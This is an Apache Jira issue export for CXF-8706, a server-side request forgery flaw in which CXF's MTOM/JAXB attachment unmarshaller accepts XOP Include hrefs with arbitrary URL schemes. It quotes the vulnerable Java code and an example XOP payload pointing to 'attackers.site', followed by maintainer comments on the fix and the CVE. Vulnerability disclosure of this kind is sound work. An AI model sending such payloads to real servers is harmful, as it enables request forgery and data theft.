<!-- 
RSS generated by JIRA (8.20.10#820010-sha1:ace47f9899e9ee25d7157d59aa17ab06aee30d3d) at Wed Nov 12 12:39:06 UTC 2025

It is possible to restrict the fields that are returned in this document by specifying the 'field' parameter in your request.
For example, to request only the issue key and summary append 'field=key&field=summary' to the URL of your request.
-->
<rss version="0.92" >
<channel>
    <title>ASF Jira</title>
    <link>https://issues.apache.org/jira</link>
    <description>This file is an XML representation of an issue</description>
    <language>en-uk</language>    <build-info>
        <version>8.20.10</version>
        <build-number>820010</build-number>
        <build-date>22-06-2022</build-date>
    </build-info>


<item>
            <title>[CXF-8706] CXF MTOM handler allow content injection</title>
                <link>https://issues.apache.org/jira/browse/CXF-8706</link>
                <project id="12310511" key="CXF">CXF</project>
                    <description>&lt;p&gt;When used with SOAP web service or JAXRS web service with MTOM enabled, Unmarshaller allows XOP Include tag to have href attributes that allow any protocols.&#160; According to the W3C MTOM spec, only &quot;cid:&quot; should be allowed for href scheme.&lt;/p&gt;

&lt;p&gt;The affected call stack is:&lt;/p&gt;

&lt;p&gt;&#160; &#160; AttachmentUtil.getAttachmentDataSource(String, Collection&amp;lt;Attachment&amp;gt;) line: 554 &#160; &#160;&lt;br/&gt;
&#160; &#160; JAXBAttachmentUnmarshaller.getAttachmentAsDataHandler(String) line: 49 &#160; &#160;&lt;br/&gt;
&#160; &#160; MTOMDecorator.startElement(TagName) line: 70 &#160; &#160;&lt;/p&gt;

&lt;p&gt;The source code is:&lt;/p&gt;

&lt;p&gt;public static DataSource getAttachmentDataSource(String contentId, Collection&amp;lt;Attachment&amp;gt; atts) {&lt;br/&gt;
&#160; &#160; &#160; &#160; // Is this right? - DD&lt;br/&gt;
&#160; &#160; &#160; &#160; if (contentId.startsWith(&quot;cid:&quot;)) {&lt;br/&gt;
&#160; &#160; &#160; &#160; &#160; &#160; try &lt;/p&gt;
{
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; contentId = URLDecoder.decode(contentId.substring(4), StandardCharsets.UTF_8.name());
&#160; &#160; &#160; &#160; &#160; &#160; }
&lt;p&gt; catch (UnsupportedEncodingException ue) &lt;/p&gt;
{
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; contentId = contentId.substring(4);
&#160; &#160; &#160; &#160; &#160; &#160; }
&lt;p&gt;&#160; &#160; &#160; &#160; &#160; &#160; return loadDataSource(contentId, atts);&lt;br/&gt;
&#160; &#160; &#160; &#160; } else if (contentId.indexOf(&quot;://&quot;) == -1) &lt;/p&gt;
{
&#160; &#160; &#160; &#160; &#160; &#160; return loadDataSource(contentId, atts);
&#160; &#160; &#160; &#160; }
&lt;p&gt; else {// should only take cid for XOP&lt;br/&gt;
&#160; &#160; &#160; &#160; &#160; &#160; try &lt;/p&gt;
{
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; return new URLDataSource(new URL(contentId));
&#160; &#160; &#160; &#160; &#160; &#160; }
&lt;p&gt; catch (MalformedURLException e) &lt;/p&gt;
{
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; throw new Fault(e);
&#160; &#160; &#160; &#160; &#160; &#160; }
&lt;p&gt;&#160; &#160; &#160; &#160; }&lt;/p&gt;

&lt;p&gt;&#160; &#160; }&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;The exploit can send payload containing:&lt;/p&gt;

&lt;p&gt;&amp;lt;stringvalue&amp;gt;&amp;lt;inc:Include href=&quot;http://attackers.site/exploit/payload&quot; xmlns:inc=&quot;http://www.w3.org/2004/08/xop/include&quot;/&amp;gt;&amp;lt;stringvalue&amp;gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13445903">CXF-8706</key>
            <summary>CXF MTOM handler allow content injection</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="reta">Andriy Redko</assignee>
                                    <reporter username="cqlin">Chunqing Lin</reporter>
                        <labels>
                    </labels>
                <created>Thu, 19 May 2022 20:38:53 +0000</created>
                <updated>Mon, 18 Sep 2023 18:48:12 +0000</updated>
                            <resolved>Wed, 30 Nov 2022 23:37:09 +0000</resolved>
                                    <version>3.5.2</version>
                                    <fixVersion>3.4.10</fixVersion>
                    <fixVersion>3.5.5</fixVersion>
                    <fixVersion>4.0.0</fixVersion>
                    <fixVersion>3.6.0</fixVersion>
                                    <component>JAXB Databinding</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>4</watches>
                                                                                                                <comments>
                            <comment id="17649304" author="bergers" created="Mon, 19 Dec 2022 12:35:55 +0000"  >&lt;p&gt;I don&apos;t think this is limited to MTOM enabled only.&lt;/p&gt;

&lt;p&gt;I can send MTOM requests to my server with an Endpoint where &lt;tt&gt;SOAPBinding.isMTOMEnabled()&lt;/tt&gt; returns false.&lt;/p&gt;

&lt;p&gt;Is it possible that &lt;tt&gt;.isMTOMEnabled() == false&lt;/tt&gt; is ignored on the server side? Debugging breakpoints aren&apos;t triggered. Neither on startup, nor when an MTOM request is received.&lt;/p&gt;</comment>
                            <comment id="17649529" author="reta" created="Tue, 20 Dec 2022 01:58:19 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=bergers&quot; class=&quot;user-hover&quot; rel=&quot;bergers&quot;&gt;bergers&lt;/a&gt; the fix disables arbitrary data sources by default, w/o MTOM enabled. Regarding the usage of the `SOAPBinding.isMTOMEnabled()`, I am not sure, seems like Apache CXF have alternative &lt;b&gt;`&lt;font color=&quot;#000000&quot;&gt;Message.&lt;/font&gt;&lt;/b&gt;&lt;font color=&quot;#0000c0&quot;&gt;MTOM_ENABLED`&lt;/font&gt;&lt;font color=&quot;#172b4d&quot;&gt; &lt;/font&gt;&lt;font color=&quot;#172b4d&quot;&gt;contextual property to control this behavior, thank you. &lt;/font&gt;&lt;/p&gt;</comment>
                            <comment id="17650941" author="JIRAUSER289757" created="Wed, 21 Dec 2022 17:06:02 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=bergers&quot; class=&quot;user-hover&quot; rel=&quot;bergers&quot;&gt;bergers&lt;/a&gt; , this is not limited MTOM, basically it is part of the XML parser flow, so as long as the JAXBAttachmentUnmarshaller is being used, regardless MTOM enabled or not, or maybe even when it is JAX-RS call, it will trigger this issue.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=reta&quot; class=&quot;user-hover&quot; rel=&quot;reta&quot;&gt;reta&lt;/a&gt; , I am glad this is fixed.&#160; I looked at the Pull Request and all look good to me.&lt;/p&gt;

&lt;p&gt;Did this prompted the new CVE-2022-46364: Apache CXF SSRF Vulnerability?&lt;/p&gt;

&lt;p&gt;In the future, is there any better channel than this public Jira to report such vulnerability?&#160; I have been kind of worried in the last few months that this information is publicly available.&lt;/p&gt;

&lt;p&gt;Thanks in advance.&lt;/p&gt;</comment>
                            <comment id="17651023" author="reta" created="Wed, 21 Dec 2022 23:38:30 +0000"  >&lt;p&gt;Thanks &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cqlin&quot; class=&quot;user-hover&quot; rel=&quot;cqlin&quot;&gt;cqlin&lt;/a&gt;&#160;&lt;/p&gt;

&lt;p&gt;&amp;gt; Did this prompted the new CVE-2022-46364: Apache CXF SSRF Vulnerability?&lt;/p&gt;

&lt;p&gt;Not sure if I understand the question, but arbitrary data sources are disabled by default, w/o any MTOM enablement mechanism.&lt;/p&gt;

&lt;p&gt;&amp;gt; In the future, is there any better channel than this public Jira to report such vulnerability? &#160;I have been kind of worried in the last few months that this information is publicly available.&lt;/p&gt;

&lt;p&gt;Since we are ASF project, the &lt;a href=&quot;https://www.apache.org/security/&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://www.apache.org/security/&lt;/a&gt; policy regarding vulnerabilities reporting applies.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12310060" key="com.atlassian.jira.plugin.system.customfieldtypes:select">
                        <customfieldname>Estimated Complexity</customfieldname>
                        <customfieldvalues>
                                <customfieldvalue key="10060"><![CDATA[Unknown]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 46 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z12iwg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>
</channel>
</rss>